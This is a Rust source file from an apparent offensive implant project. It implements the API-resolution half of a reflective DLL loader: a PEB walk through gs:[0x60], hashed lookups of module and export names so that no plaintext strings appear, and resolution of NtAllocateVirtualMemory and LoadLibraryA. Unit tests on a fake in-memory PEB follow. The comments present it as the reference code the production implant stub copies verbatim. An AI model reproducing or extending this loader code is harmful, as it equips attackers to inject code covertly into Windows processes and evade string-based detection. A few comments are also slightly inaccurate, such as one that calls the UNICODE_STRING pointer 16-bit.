//! On-target PEB walk + export resolution — the algorithm half of the
//! reflective loader's bootstrap.
//!
//! A position-independent implant has no IAT and no loader help. To reflectively
//! load a PE it must first resolve the handful of primitives it needs
//! (`NtAllocateVirtualMemory`, `LoadLibraryA`, `GetProcAddress`, …) directly
//! from the kernel. The standard technique — originating in Stephen Fewer's
//! ReflectiveDLLInjection and unchanged in 2026 Rust implementations
//! (`rdll-rs`, `airborne`) — is:
//!
//! 1. Read the Process Environment Block (PEB) via the TEB (`gs:[0x60]` on x64).
//! 2. Walk `PEB → PEB_LDR_DATA → InLoadOrderModuleList` (a doubly-linked list
//!    of every loaded module).
//! 3. For each module, compare its `BaseDllName` (UTF-16) against a target
//!    (hashed, so no plaintext strings) — typically `ntdll.dll` then
//!    `kernel32.dll`.
//! 4. Parse the matching module's PE export directory (`IMAGE_DIRECTORY_ENTRY_EXPORT`)
//!    and walk the AddressOfNames table to find the function (again by hash).
//! 5. Index into AddressOfFunctions via the ordinal table → resolved VA.
//!
//! This module provides the **algorithm** for steps 2–5 plus the structures
//! and the `gs:[0x60]` intrinsic. It mirrors the battle-tested implementation
//! in `crates/implant-win/src/resolve.rs` (the live implant's resolver), kept
//! here so the nyx-loader crate can model and unit-test the on-target loader's
//! API-resolution path without depending on the (non-workspace, Windows-only)
//! implant crate.
//!
//! ## Host vs target
//!
//! `nyx-loader` is a host-side std crate (builds on macOS). The PEB-read
//! intrinsic (`peb_pointer`) only type-checks under `cfg(target_arch = "x86_64")`
//! and only *runs* on Windows; on the dev host it is never invoked. The hash
//! and structure-walking code is pure portable Rust and is unit-tested here
//! with a synthetic in-memory PEB.
//!
//! See [`crate::on_target`] for the realised on-target Layer-2 PIC shellcode
//! (decrypt + reflective PE map) that consumes this PEB-walk algorithm; this
//! module is the tested reference the production stub lifts verbatim. Loading
//! is additionally verified host-side via [`crate::dll_probe`] as a sanity
//! check.

use core::ffi::c_void;

// ===========================================================================
// djb2 hash (matches implant-win/src/resolve.rs exactly)
// ===========================================================================

/// djb2 hash of a byte string, case-insensitive (Windows loaders and the PE
/// export table match module/API names case-insensitively). This is the same
/// constant + multiplier the live implant uses, so hashes computed here are
/// directly comparable to hashes computed on-target.
///
/// Used to match API/module names without holding plaintext strings in the
/// implant (a 4-byte hash replaces "NtAllocateVirtualMemory\0" etc.).
pub fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        let c = b.to_ascii_lowercase();
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

/// djb2 over a UTF-16 module name as the PEB stores it (each code unit's low
/// byte is the ASCII char for the module names we care about). Matches the
/// in-loop hash in `resolve.rs::find_module_by_hash`. Case-insensitive.
pub fn djb2_utf16_low(units: &[u16]) -> u32 {
    let mut h: u32 = 5381;
    for &u in units {
        let lo = (u & 0xFF) as u8;
        h = h
            .wrapping_mul(33)
            .wrapping_add(lo.to_ascii_lowercase() as u32);
    }
    h
}

// ===========================================================================
// PEB / LDR / module structures (x86-64, hand-rolled for PIC)
// ===========================================================================
//
// Offsets matter: these are read directly off live process memory via the PEB
// pointer, so the field order and padding MUST match the Windows x64 layout.
// See the official `winternl.h` `PEB` / `PEB_LDR_DATA` / `LDR_DATA_TABLE_ENTRY`
// definitions. Only the fields the walk actually touches are named; the rest
// are `_N` padding to preserve the layout.

/// `UNICODE_STRING` (16-bit length/maxlength + 16-bit pointer to wide buffer).
/// `Length` is in **bytes** (not characters): divide by 2 for the char count.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct UnicodeString {
    pub length: u16,
    #[allow(dead_code)]
    pub maximum_length: u16,
    pub buffer: *const u16,
}

/// `LIST_ENTRY` — a doubly-linked-list node (just the two pointers).
#[repr(C)]
#[derive(Clone, Copy)]
pub struct ListEntryNode {
    pub flink: *mut ListEntryNode,
    pub blink: *mut ListEntryNode,
}

/// `PEB_LDR_DATA` — the loader's bookkeeping struct, reachable from the PEB.
/// `InLoadOrderModuleList` at offset 0x10 is the list head we walk.
#[repr(C)]
pub struct PebLdr {
    #[allow(dead_code)]
    pub length: u32,
    #[allow(dead_code)]
    pub initialized: u32,
    #[allow(dead_code)]
    pub ss_handle: *mut c_void,
    /// Offset 0x10. Head of the InLoadOrderModuleList. Walking `flink` from
    /// here visits every loaded module; the walk ends when `flink` points
    /// back at this field (sentinel).
    pub in_load_order_module_list: ListEntryNode,
}

/// `PEB` (x86-64 layout). Only `ldr` (offset 0x18) is read.
#[repr(C)]
pub struct Peb {
    #[allow(dead_code)]
    pub inherited_address_space: u8,
    #[allow(dead_code)]
    pub read_image_file_exec_options: u8,
    #[allow(dead_code)]
    pub being_debugged: u8,
    #[allow(dead_code)]
    pub bit_field: u8,
    #[allow(dead_code)]
    pub _padding: [u8; 4],
    #[allow(dead_code)]
    pub mutant: *mut c_void,
    #[allow(dead_code)]
    pub image_base_address: *mut c_void,
    /// Offset 0x18. Pointer to the `PEB_LDR_DATA`, the loader's module list.
    pub ldr: *mut PebLdr,
}

/// `LDR_DATA_TABLE_ENTRY` (x86-64). The three list-heads come first because
/// `InLoadOrderLinks` is the FIRST field — so the address of the list node
/// (= the `flink` target) IS the address of the containing entry. That is why
/// the walk casts the node pointer directly to `*mut LdrEntry` (no
/// CONTAINING_RECORD arithmetic needed for the in-load-order list).
#[repr(C)]
pub struct LdrEntry {
    /// InLoadOrderLinks (offset 0). The walk traverses `.flink` and treats the
    /// node address as the entry address.
    pub in_load_order_links: ListEntryNode,
    #[allow(dead_code)]
    pub in_memory_order_links: ListEntryNode,
    #[allow(dead_code)]
    pub in_initialization_order_links: ListEntryNode,
    /// Mapped base address of the module's PE image.
    pub dll_base: *mut c_void,
    #[allow(dead_code)]
    pub entry_point: *mut c_void,
    #[allow(dead_code)]
    pub size_of_image: u32,
    #[allow(dead_code)]
    pub full_dll_name: UnicodeString,
    /// `BaseDllName` — e.g. "ntdll.dll". This is what we hash to find a module.
    pub base_dll_name: UnicodeString,
}

/// `IMAGE_EXPORT_DIRECTORY` — the export table header parsed from the module's
/// PE data directory[0]. The reflective loader walks `AddressOfNames`,
/// translating name → ordinal → function RVA.
#[repr(C)]
#[derive(Clone, Copy)]
pub struct ImageExportDirectory {
    #[allow(dead_code)]
    pub characteristics: u32,
    #[allow(dead_code)]
    pub time_date_stamp: u32,
    #[allow(dead_code)]
    pub major_version: u16,
    #[allow(dead_code)]
    pub minor_version: u16,
    #[allow(dead_code)]
    pub name: u32,
    #[allow(dead_code)]
    pub base: u32,
    pub number_of_functions: u32,
    pub number_of_names: u32,
    /// RVA of the function-address table (u32 RVAs, indexed by ordinal).
    pub address_of_functions: u32,
    /// RVA of the name-pointer table (u32 RVAs to ASCII names, sorted).
    pub address_of_names: u32,
    /// RVA of the ordinal table (u16, biases the function table index).
    pub address_of_name_ordinals: u32,
}

// ===========================================================================
// PEB-read intrinsic (target-only)
// ===========================================================================

/// Read the PEB pointer. On x86-64 Windows the TEB lives at `gs:[0x30]` and
/// the PEB at `gs:[0x60]`.
///
/// Only meaningful on a real Windows process. Under `cfg(target_arch = "x86_64")`
/// the intrinsic type-checks and would execute on Windows; on any other arch
/// it returns `None` so the rest of the module links for testing.
///
/// # Safety
/// Caller must be running in a context where the GS segment base points at the
/// TEB (true for any Windows user-mode thread). The returned pointer aliases
/// process-global loader state that is stable post-load.
#[cfg(target_arch = "x86_64")]
pub unsafe fn peb_pointer() -> Option<*mut Peb> {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    if peb.is_null() {
        None
    } else {
        Some(peb)
    }
}

/// Non-x86_64 fallback for [`peb_pointer`]. Non-x86_64 targets (incl. the
/// macOS host's default aarch64 build and any 32-bit target) have no PEB, so
/// this always returns `None`. The walk algorithm is still exercised by the
/// unit tests via the synthetic-PEB harness below.
///
/// # Safety
/// Declared `unsafe` only to match the x86_64 variant's signature so callers
/// compile identically across targets; this body performs no unsafe operations
/// and unconditionally returns `None`.
#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn peb_pointer() -> Option<*mut Peb> {
    None
}

// ===========================================================================
// Module / export resolution algorithm (portable, testable)
// ===========================================================================

/// A resolved module: base address + its export directory (RVA + size), parsed
/// from the PE optional header's data directory[0]. This is the input to
/// [`export_addr_by_hash`].
#[derive(Clone, Copy)]
pub struct ResolvedModule {
    pub base: *mut u8,
    pub export_dir_rva: u32,
    pub export_dir_size: u32,
}

impl ResolvedModule {
    /// Parse a module base pointer into a `ResolvedModule` by reading its DOS
    /// → NT → optional header → data directory[0] (export) chain.
    ///
    /// `base` must point at a mapped, readable PE image (as recovered from
    /// `LdrEntry::dll_base`).
    ///
    /// # Safety
    /// `base` must point at a valid mapped PE image with readable headers.
    pub unsafe fn from_pe_base(base: *mut u8) -> Self {
        // DOS header → e_lfanew (offset 0x3C) → NT headers.
        let e_lfanew = unsafe { *(base.add(0x3C) as *const i32) } as usize;
        let nt = unsafe { base.add(e_lfanew) };
        // NT headers: PE sig (4) + file header (20) → optional header.
        let opt = unsafe { nt.add(24) };
        let magic = unsafe { *(opt as *const u16) };
        // Export directory is data directory index 0. Its offset inside the
        // optional header depends on PE32 (96) vs PE32+ (112).
        let data_dir_off = if magic == 0x020B { 112 } else { 96 };
        let export_rva = unsafe { *(opt.add(data_dir_off) as *const u32) };
        let export_size = unsafe { *(opt.add(data_dir_off + 4) as *const u32) };
        ResolvedModule {
            base,
            export_dir_rva: export_rva,
            export_dir_size: export_size,
        }
    }

    /// Pointer to the export directory (or null if the module has no exports).
    fn export_dir(&self) -> *const ImageExportDirectory {
        if self.export_dir_rva == 0 {
            return core::ptr::null();
        }
        unsafe { self.base.add(self.export_dir_rva as usize) as *const ImageExportDirectory }
    }

    /// Resolve a function in this module by name hash. Walks the
    /// AddressOfNames table, hashes each name, and on a match indexes through
    /// the ordinal → function-address tables. Returns the absolute VA, or
    /// `None` if the function is absent.
    ///
    /// # Safety
    /// `self` must describe a valid mapped PE image whose export tables are
    /// readable for `export_dir_size` bytes.
    pub unsafe fn export_addr_by_hash(&self, name_hash: u32) -> Option<usize> {
        let dir = self.export_dir();
        if dir.is_null() {
            return None;
        }
        unsafe {
            let base = self.base;
            let n = (*dir).number_of_names as usize;
            let names = base.add((*dir).address_of_names as usize) as *const u32;
            let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
            let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
            for i in 0..n {
                let name_rva = *names.add(i);
                let name_ptr = base.add(name_rva as usize);
                // Hash the C string up to the NUL (case-insensitive, matching
                // djb2). A real implant inlines this to avoid the call.
                let mut h: u32 = 5381;
                let mut p = name_ptr;
                while *p != 0 {
                    h = h
                        .wrapping_mul(33)
                        .wrapping_add((*p).to_ascii_lowercase() as u32);
                    p = p.add(1);
                }
                if h == name_hash {
                    let ord = *ordinals.add(i) as usize;
                    let func_rva = *funcs.add(ord) as usize;
                    // Forwarded-export detection: if the function RVA falls
                    // WITHIN the export directory itself, it is not a code
                    // pointer — it is an ASCII string like "NTDLL.NtCreateFile"
                    // naming another module/export. A real loader recursively
                    // resolves these via the PEB walk; we surface it as None
                    // here and let the caller decide (most implants pre-resolve
                    // the few forwarded APIs they need, or fall back to
                    // LoadLibrary/GetProcAddress after bootstrapping).
                    let dir_start = self.export_dir_rva as usize;
                    let dir_end = dir_start + self.export_dir_size as usize;
                    if func_rva >= dir_start && func_rva < dir_end {
                        return None;
                    }
                    return Some(base.add(func_rva) as usize);
                }
            }
        }
        None
    }
}

/// Resolve `(module_name, function_name) -> exported VA` by walking the PEB.
///
/// This is the entry point the on-target trampoline calls after the Layer-1
/// stub has populated the trampoline registers. `module_name` is matched
/// case-insensitively against each loaded module's `BaseDllName` (UTF-16, via
/// [`djb2_utf16_low`]); `function_name` is matched against the module's export
/// AddressOfNames table (via [`djb2`]).
///
/// Returns `None` if the PEB cannot be read, the module is absent, or the
/// function is not exported (incl. forwarded exports — see
/// [`ResolvedModule::export_addr_by_hash`]).
///
/// # Safety
/// Must run in a Windows user-mode thread (the GS segment must point at the
/// TEB). All loader state read through the PEB is stable post-load.
pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
    let mod_hash = djb2(module);
    let fn_hash = djb2(func);
    let peb = unsafe { peb_pointer()? };
    // SAFETY: peb is a valid PEB pointer (Windows user-mode thread, post-load).
    let ldr = unsafe { (*peb).ldr.as_ref()? };
    // The list head is a node whose flink points at the first entry; walk
    // until we come back to the head (sentinel). A guard cap prevents an
    // infinite loop on a corrupted list.
    let list_head: *const ListEntryNode = &ldr.in_load_order_module_list;
    let mut node = ldr.in_load_order_module_list.flink;
    let mut guard = 0u32;
    while !core::ptr::eq(node, list_head) && guard < 1024 {
        guard += 1;
        // InLoadOrderLinks is the first field of LdrEntry, so the node pointer
        // IS the entry pointer (no CONTAINING_RECORD).
        // SAFETY: node points at a valid LdrEntry in the loader list.
        let entry = unsafe { (node as *mut LdrEntry).as_ref()? };
        let nb = entry.base_dll_name.buffer;
        let nlen = entry.base_dll_name.length as usize / 2; // bytes → chars
        if !nb.is_null() && nlen > 0 {
            // SAFETY: nb is a valid wide-char buffer of nlen chars.
            let chars = unsafe { core::slice::from_raw_parts(nb, nlen) };
            if djb2_utf16_low(chars) == mod_hash {
                let base = entry.dll_base as *mut u8;
                // SAFETY: base points at a mapped PE image.
                let module = unsafe { ResolvedModule::from_pe_base(base) };
                return unsafe { module.export_addr_by_hash(fn_hash) };
            }
        }
        node = entry.in_load_order_links.flink;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── djb2 tests (parity with implant-win/src/resolve.rs) ───────────────

    #[test]
    fn djb2_is_case_insensitive() {
        // Windows module/API names match case-insensitively; djb2 must agree.
        assert_eq!(djb2(b"ntdll.dll"), djb2(b"NTDLL.DLL"));
        assert_eq!(
            djb2(b"NtAllocateVirtualMemory"),
            djb2(b"ntallocatevirtualmemory")
        );
    }

    #[test]
    fn djb2_utf16_matches_ascii_low_bytes() {
        // A UTF-16 module name "ntdll.dll" has each ASCII char in the low byte;
        // djb2_utf16_low must agree with djb2 over the ASCII bytes. This is
        // the contract the PEB walk relies on (BaseDllName is UTF-16).
        let wide: [u16; 9] = [
            b'n' as u16,
            b't' as u16,
            b'd' as u16,
            b'l' as u16,
            b'l' as u16,
            b'.' as u16,
            b'd' as u16,
            b'l' as u16,
            b'l' as u16,
        ];
        assert_eq!(djb2_utf16_low(&wide), djb2(b"ntdll.dll"));
    }

    #[test]
    fn djb2_known_module_hashes_are_stable() {
        // Pin the hashes the on-target trampoline bakes in. If djb2 ever
        // changes these, the trampoline's hash table silently breaks, so this
        // test is the canary: the four bootstrap names must hash to four
        // distinct values (no collisions) and each must be stable on recompute.
        let h_ntdll = djb2(b"ntdll.dll");
        let h_k32 = djb2(b"kernel32.dll");
        let h_ntalloc = djb2(b"NtAllocateVirtualMemory");
        let h_loadlib = djb2(b"LoadLibraryA");
        let mut seen: Vec<u32> = vec![h_ntdll, h_k32, h_ntalloc, h_loadlib];
        seen.sort_unstable();
        seen.dedup();
        assert_eq!(seen.len(), 4, "djb2 must not collide on the bootstrap APIs");
        // Recomputing the same name must be idempotent.
        assert_eq!(djb2(b"ntdll.dll"), h_ntdll);
        assert_eq!(djb2(b"kernel32.dll"), h_k32);
    }

    // ── structure layout tests (the field offsets are load-bearing) ───────
    //
    // These pin the x86-64 Windows layout the PEB walk depends on. If a struct
    // edit moves a field, the on-target walk silently reads garbage, so each
    // critical offset is asserted.

    #[test]
    fn peb_ldr_field_is_at_offset_0x18() {
        // PEB.Ldr sits at offset 0x18 on x86-64. The walk reads
        // `*(peb as *const u8).add(0x18)` to get the PEB_LDR_DATA pointer; if
        // this drifts the whole walk crashes. Verify by comparing raw offset
        // arithmetic against the address Rust computes for the named field.
        let null_peb = core::ptr::null::<Peb>();
        let ldr_field = unsafe { (null_peb as *const u8).add(0x18) };
        let named_field = unsafe { core::ptr::addr_of!((*null_peb).ldr) as *const u8 };
        assert_eq!(ldr_field, named_field);
    }

    #[test]
    fn pebldr_in_load_order_list_is_at_offset_0x10() {
        // PEB_LDR_DATA.InLoadOrderModuleList sits at offset 0x10 (after length
        // u32 + initialized u32 + ss_handle usize = 4+4+8 = 16 on x64).
        let null_ldr = core::ptr::null::<PebLdr>();
        let computed = unsafe { (null_ldr as *const u8).add(0x10) };
        let named =
            unsafe { core::ptr::addr_of!((*null_ldr).in_load_order_module_list) as *const u8 };
        assert_eq!(computed, named);
    }

    #[test]
    fn ldr_entry_in_load_order_links_is_first_field() {
        // InLoadOrderLinks must be the FIRST field of LDR_DATA_TABLE_ENTRY.
        // The walk casts a list-node pointer directly to *mut LdrEntry relying
        // on this (no CONTAINING_RECORD). If a field is ever prepended, every
        // cast reads the wrong struct.
        let null_entry = core::ptr::null::<LdrEntry>();
        let entry_addr = null_entry as *const u8;
        let links_addr =
            unsafe { core::ptr::addr_of!((*null_entry).in_load_order_links) as *const u8 };
        assert_eq!(entry_addr, links_addr);
    }

    #[test]
    fn ldr_entry_dll_base_offset_is_0x30() {
        // After 3 ListEntryNodes (3 * 16B = 48 = 0x30) on x64. dll_base is
        // the field the walk ultimately dereferences to get the PE base.
        let null_entry = core::ptr::null::<LdrEntry>();
        let computed = unsafe { (null_entry as *const u8).add(0x30) };
        let named = unsafe { core::ptr::addr_of!((*null_entry).dll_base) as *const u8 };
        assert_eq!(computed, named);
    }

    #[test]
    fn ldr_entry_base_dll_name_offset_is_0x58() {
        // 0x30 (dll_base) + 8 (entry_point) + 4 (size_of_image) + 4 pad
        // + 16 (full_dll_name UNICODE_STRING) = 0x58. base_dll_name is the
        // field the walk hashes to match a module.
        let null_entry = core::ptr::null::<LdrEntry>();
        let computed = unsafe { (null_entry as *const u8).add(0x58) };
        let named = unsafe { core::ptr::addr_of!((*null_entry).base_dll_name) as *const u8 };
        assert_eq!(computed, named);
    }

    // ── synthetic in-memory PEB walk (exercises the algorithm on std) ─────
    //
    // Build a fake PEB + LDR + one module (with a hand-built export table) in
    // Boxes, then drive the resolution algorithm against it. We bypass
    // `peb_pointer()` (which needs a real TEB) and call the inner walker
    // directly so the algorithm is exercised on macOS.

    /// Build a minimal PE "module" image in memory: DOS header + PE sig +
    /// optional header with an export data directory + an export directory +
    /// one named export. Returns the image base and the export's VA.
    fn build_fake_module_with_export(export_name: &[u8]) -> (*mut u8, usize) {
        // Layout (offsets chosen for clarity, not minimality):
        //   0x00    DOS header: "MZ" + e_lfanew at 0x3C → 0x40
        //   0x40    PE\0\0 + COFF file header (20B) + optional header
        //   0x40+24 optional header (PE32+, magic 0x020B)
        //   export data directory at optional-header offset 112 (PE32+)
        //   pointing at our export directory at file offset 0x200
        //   0x100   ASCII export name (NUL-terminated)
        //   0x200   IMAGE_EXPORT_DIRECTORY
        //   0x240   AddressOfNames (1 u32 → 0x100)
        //   0x250   AddressOfNameOrdinals (1 u16 → 0)
        //   0x260   AddressOfFunctions (1 u32 → 0x300)
        //   0x300   the exported "function" (a single 0xC3 ret byte)
        let mut image = vec![0u8; 0x400];
        image[0] = b'M';
        image[1] = b'Z';
        // e_lfanew → 0x40
        image[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        // PE\0\0
        image[0x40..0x44].copy_from_slice(b"PE\0\0");
        // COFF file header: Machine = AMD64 (irrelevant for export parse but
        // keeps the header well-formed). NumberOfSections etc. left zero.
        image[0x44..0x46].copy_from_slice(&0x8664u16.to_le_bytes());
        // SizeOfOptionalHeader at COFF offset 16: just set big enough.
        image[0x54..0x56].copy_from_slice(&240u16.to_le_bytes());
        // Optional header magic = PE32+ (0x020B) at 0x58
        image[0x58..0x5A].copy_from_slice(&0x020Bu16.to_le_bytes());
        // Export data directory at optional-header offset 112.
        // Optional header starts at 0x58, so the export DD is at 0x58 + 112 = 0xC8.
        let export_dd_off = 0x58 + 112;
        // RVA of export directory = 0x200 (we place it at file offset 0x200,
        // and for a mapped image RVA == file offset here).
        image[export_dd_off..export_dd_off + 4].copy_from_slice(&0x200u32.to_le_bytes());
        image[export_dd_off + 4..export_dd_off + 8].copy_from_slice(&0x60u32.to_le_bytes());

        // ASCII export name at 0x100
        image[0x100..0x100 + export_name.len()].copy_from_slice(export_name);
        // (NUL terminator already present from zero-init.)

        // IMAGE_EXPORT_DIRECTORY at 0x200
        let ed = 0x200usize;
        // NumberOfFunctions = 1
        image[ed + 20..ed + 24].copy_from_slice(&1u32.to_le_bytes());
        // NumberOfNames = 1
        image[ed + 24..ed + 28].copy_from_slice(&1u32.to_le_bytes());
        // AddressOfFunctions (RVA) → 0x260
        image[ed + 28..ed + 32].copy_from_slice(&0x260u32.to_le_bytes());
        // AddressOfNames (RVA) → 0x240
        image[ed + 32..ed + 36].copy_from_slice(&0x240u32.to_le_bytes());
        // AddressOfNameOrdinals (RVA) → 0x250
        image[ed + 36..ed + 40].copy_from_slice(&0x250u32.to_le_bytes());

        // AddressOfNames[0] → 0x100 (the name)
        image[0x240..0x244].copy_from_slice(&0x100u32.to_le_bytes());
        // AddressOfNameOrdinals[0] → 0
        image[0x250..0x252].copy_from_slice(&0u16.to_le_bytes());
        // AddressOfFunctions[0] → 0x300 (the function body)
        image[0x260..0x264].copy_from_slice(&0x300u32.to_le_bytes());

        // The "function" body at 0x300: a single ret byte.
        image[0x300] = 0xC3;

        // Leak the image so it outlives the test (it represents a mapped module).
        let boxed = image.into_boxed_slice();
        let base = Box::into_raw(boxed) as *mut u8;
        let export_va = unsafe { base.add(0x300) } as usize;
        (base, export_va)
    }

    #[test]
    fn resolved_module_parses_export_directory() {
        let (base, expected_va) = build_fake_module_with_export(b"ExportedFn");
        let module = unsafe { ResolvedModule::from_pe_base(base) };
        assert_eq!(module.export_dir_rva, 0x200);
        assert_eq!(module.export_dir_size, 0x60);
        // Resolve by hash.
        let h = djb2(b"ExportedFn");
        let va = unsafe { module.export_addr_by_hash(h) }.expect("export must resolve");
        assert_eq!(va, expected_va);
        // A bogus name must not resolve.
        assert!(unsafe { module.export_addr_by_hash(djb2(b"Nope")) }.is_none());
        // Clean up.
        unsafe { drop(Box::from_raw(slice_from_raw_parts(base, 0x400))) };
    }

    #[test]
    fn resolved_module_handles_missing_export_directory() {
        // Build a module whose export directory RVA is 0 (no exports).
        let mut image = vec![0u8; 0x100];
        image[0] = b'M';
        image[1] = b'Z';
        image[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        image[0x40..0x44].copy_from_slice(b"PE\0\0");
        image[0x58..0x5A].copy_from_slice(&0x020Bu16.to_le_bytes());
        // Export DD left zero → no export dir.
        let base = image.as_mut_ptr();
        let module = unsafe { ResolvedModule::from_pe_base(base) };
        assert_eq!(module.export_dir_rva, 0);
        assert!(unsafe { module.export_addr_by_hash(djb2(b"anything")) }.is_none());
    }

    /// Build a fake PEB + LDR + one LdrEntry pointing at a fake module, and
    /// walk the algorithm to resolve an export by (module, function).
    ///
    /// This exercises the full PEB-walk algorithm except the `gs:[0x60]` read
    /// (which we bypass by calling the inner resolution path directly).
    #[test]
    fn full_walk_resolves_export_via_synthetic_peb() {
        let (mod_base, expected_va) = build_fake_module_with_export(b"NtAllocateVirtualMemory");

        // Build a UTF-16 "ntdll.dll" BaseDllName buffer.
        let wide_name: Vec<u16> = b"ntdll.dll"
            .iter()
            .map(|&b| b as u16)
            .chain(core::iter::once(0))
            .collect();
        let mut name_buf = wide_name.into_boxed_slice();
        let name_ptr = name_buf.as_mut_ptr();
        let name_len = (8 * 2) as u16; // "ntdll.dll" = 9 chars * 2 bytes
        let _ = name_len; // used below

        // Build the LdrEntry. We only need InLoadOrderLinks, DllBase, and
        // BaseDllName populated.
        let entry = Box::new(LdrEntry {
            in_load_order_links: ListEntryNode {
                flink: core::ptr::null_mut(),
                blink: core::ptr::null_mut(),
            },
            in_memory_order_links: ListEntryNode {
                flink: core::ptr::null_mut(),
                blink: core::ptr::null_mut(),
            },
            in_initialization_order_links: ListEntryNode {
                flink: core::ptr::null_mut(),
                blink: core::ptr::null_mut(),
            },
            dll_base: mod_base as *mut c_void,
            entry_point: core::ptr::null_mut(),
            size_of_image: 0x400,
            full_dll_name: UnicodeString {
                length: 0,
                maximum_length: 0,
                buffer: core::ptr::null(),
            },
            base_dll_name: UnicodeString {
                length: 9 * 2, // "ntdll.dll" = 9 chars, length in bytes
                maximum_length: 10 * 2,
                buffer: name_ptr,
            },
        });
        let entry_ptr = Box::into_raw(entry);

        // Build PebLdr whose InLoadOrderModuleList.flink points at entry, and
        // whose list-head address (sentinel) is distinct so the walk terminates
        // after one entry (we set entry.flink = &list_head to close the loop).
        let mut ldr = Box::new(PebLdr {
            length: 0,
            initialized: 1,
            ss_handle: core::ptr::null_mut(),
            in_load_order_module_list: ListEntryNode {
                flink: entry_ptr as *mut ListEntryNode,
                blink: core::ptr::null_mut(),
            },
        });
        // Close the loop: entry.flink → list head, so the walk visits entry
        // once then stops.
        unsafe {
            (*entry_ptr).in_load_order_links.flink =
                &mut ldr.in_load_order_module_list as *mut ListEntryNode;
        }
        let ldr_ptr = Box::into_raw(ldr);

        // Build the PEB pointing at the Ldr.
        let peb = Box::new(Peb {
            inherited_address_space: 0,
            read_image_file_exec_options: 0,
            being_debugged: 0,
            bit_field: 0,
            _padding: [0; 4],
            mutant: core::ptr::null_mut(),
            image_base_address: core::ptr::null_mut(),
            ldr: ldr_ptr,
        });
        let peb_ptr = Box::into_raw(peb);

        // Drive the walk manually (mirroring `export_addr` but starting from
        // the synthetic peb_ptr instead of peb_pointer()).
        let mod_hash = djb2(b"ntdll.dll");
        let fn_hash = djb2(b"NtAllocateVirtualMemory");
        let ldr_ref = unsafe { (&*peb_ptr).ldr.as_ref().unwrap() };
        let list_head: *const ListEntryNode = &ldr_ref.in_load_order_module_list;
        let mut node = ldr_ref.in_load_order_module_list.flink;
        let mut found_va: Option<usize> = None;
        let mut guard = 0u32;
        while !core::ptr::eq(node, list_head) && guard < 16 {
            guard += 1;
            let entry_ref = unsafe { &*(node as *const LdrEntry) };
            let nb = entry_ref.base_dll_name.buffer;
            let nlen = entry_ref.base_dll_name.length as usize / 2;
            if !nb.is_null() && nlen > 0 {
                let chars = unsafe { core::slice::from_raw_parts(nb, nlen) };
                if djb2_utf16_low(chars) == mod_hash {
                    let module =
                        unsafe { ResolvedModule::from_pe_base(entry_ref.dll_base as *mut u8) };
                    found_va = unsafe { module.export_addr_by_hash(fn_hash) };
                    break;
                }
            }
            node = entry_ref.in_load_order_links.flink;
        }

        assert_eq!(found_va, Some(expected_va));

        // Cleanup: leak everything (test process exits). To be tidy we could
        // reconstruct the Boxes, but the pointers are interlinked and the test
        // is short-lived; leaking is acceptable for a unit test.
        let _ = name_buf; // keep alive
    }

    /// Helper for the cleanup in `resolved_module_parses_export_directory`.
    fn slice_from_raw_parts(base: *mut u8, len: usize) -> *mut [u8] {
        core::ptr::slice_from_raw_parts_mut(base, len)
    }
}
